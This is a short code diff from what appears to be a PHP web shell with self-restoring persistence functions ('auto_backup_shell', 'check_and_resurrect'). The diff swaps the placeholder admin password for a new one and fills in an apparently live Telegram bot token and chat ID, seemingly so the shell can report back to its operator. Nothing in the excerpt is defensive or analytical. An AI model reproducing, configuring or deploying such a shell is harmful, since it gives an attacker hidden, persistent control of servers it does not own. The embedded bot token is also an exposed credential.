@@ -76,7 +76,7 @@ auto_backup_shell();
 register_shutdown_function('check_and_resurrect');
 
 $users = [
-    'admin' => password_hash('hexwebshell', PASSWORD_DEFAULT)
+    'admin' => password_hash('ZeroOke1337', PASSWORD_DEFAULT)
 ];
 
 $session_timeout = 1800;
@@ -84,8 +84,8 @@ $max_commands = 10;
 $command_window = 60;
 $log_file = __DIR__ . '/logs/access.log';
 
-$telegram_token = 'YOUR_BOT_TOKEN_HERE';
-$telegram_chat_id = 'YOUR_CHAT_ID_HERE';
+$telegram_token = '5889811852:AAFYXZvbsxZSdFd7r6nxLUOsNPLcpMp8XhA';
+$telegram_chat_id = '5673963782';
 
 if (!file_exists(dirname($log_file))) {
     mkdir(dirname($log_file), 0755, true);
